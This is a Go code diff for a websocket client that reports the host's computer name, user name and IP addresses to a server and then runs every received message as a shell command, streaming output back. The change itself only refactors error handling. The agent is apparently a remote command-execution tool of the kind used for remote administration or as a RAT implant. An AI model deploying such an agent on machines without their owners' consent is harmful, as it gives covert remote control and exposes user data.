@@ -88,31 +88,30 @@ func NewClient(secretKey, computerName, userName, localIP, publicIP, OS string) 
 	return client
 }
 
-func (client *Client) Start(websocket_URL string) error {
+func (client *Client) Start(websocket_URL string) {
 	conn, _, err := websocket.Dial(context.Background(), websocket_URL, nil)
-	if err != nil { return err }
+	if err != nil { log.Panic(err) }
 	defer conn.CloseNow()
 
 	client.Conn = conn
 
 	bytes, err := json.Marshal(client)
-	if err != nil { return err }
+	if err != nil { log.Panic(err) }
 
 	err = client.Write(client.Id, -1, bytes, true)
-	if err != nil { return err }
+	if err != nil { log.Panic(err) }
 
 	msg, err := client.Read()
-	if err != nil { return err }
+	if err != nil { log.Panic(err) }
 	client.Id = msg.Receiver
 
 	go client.Ping()
 	client.Receive()
 	if ReceiveError != nil {
-		return ReceiveError
+		log.Panic(ReceiveError)
 	}
 
 	conn.Close(websocket.StatusNormalClosure, "")
-	return nil
 }
 
 func (client *Client) Ping() {
@@ -154,33 +153,31 @@ func Execute(command, os string) (*exec.Cmd, Execution, error) {
 
 func (client *Client) Receive() {
 	for {
-		go func() {
-			if PingError != nil { return }
+		if PingError != nil { return }
 
-			msg, err := client.Read()
-			if PingError != nil { return }
-			if err != nil { log.Print(err, 12) }
+		msg, err := client.Read()
+		if PingError != nil { return }
+		if err != nil { log.Print(err, 12) }
 
-			log.Print(msg, string(msg.Message))
-	
-			cmd, execution, err := Execute(string(msg.Message), client.OS)
-			if err != nil { client.Write(client.Id, msg.Sender, []byte(err.Error()), true) }
-			
-			scanner := bufio.NewScanner(execution.stdout)
-			for scanner.Scan() {
-				err := client.Write(client.Id, msg.Sender, append([]byte("#!execution "), scanner.Bytes()...), false)
-				if err != nil { log.Print(err, 123)}
-	
-				msg, err := client.Read()
-				if err != nil { log.Print(err, 321) }
-	
-				if string(msg.Message) != "ok" { cmd.Cancel(); break }
-			}
-			err = client.Write(client.Id, msg.Sender, []byte("#!execution end"), true)
+		log.Print(msg, string(msg.Message))
+
+		cmd, execution, err := Execute(string(msg.Message), client.OS)
+		if err != nil { client.Write(client.Id, msg.Sender, []byte(err.Error()), true) }
+		
+		scanner := bufio.NewScanner(execution.stdout)
+		for scanner.Scan() {
+			err := client.Write(client.Id, msg.Sender, append([]byte("#!execution "), scanner.Bytes()...), false)
 			if err != nil { log.Print(err, 123)}
 
-			defer cmd.Wait()
-		}()
+			msg, err := client.Read()
+			if err != nil { log.Print(err, 321) }
+
+			if string(msg.Message) != "ok" { cmd.Cancel(); break }
+		}
+		err = client.Write(client.Id, msg.Sender, []byte("#!execution end"), true)
+		if err != nil { log.Print(err, 123)}
+
+		defer cmd.Wait()
 	}
 }
 
@@ -282,6 +279,5 @@ func main() {
 	if err != nil { log.Fatal(err) }
 
 	client := NewClient(secretKey, computerName, userName, localIP, publicIP, runtime.GOOS)
-	err = client.Start("ws://127.0.0.1:8080/ws/")
-	if err != nil { log.Print(err) }
+	client.Start("ws://127.0.0.1:8080/ws/")
 }
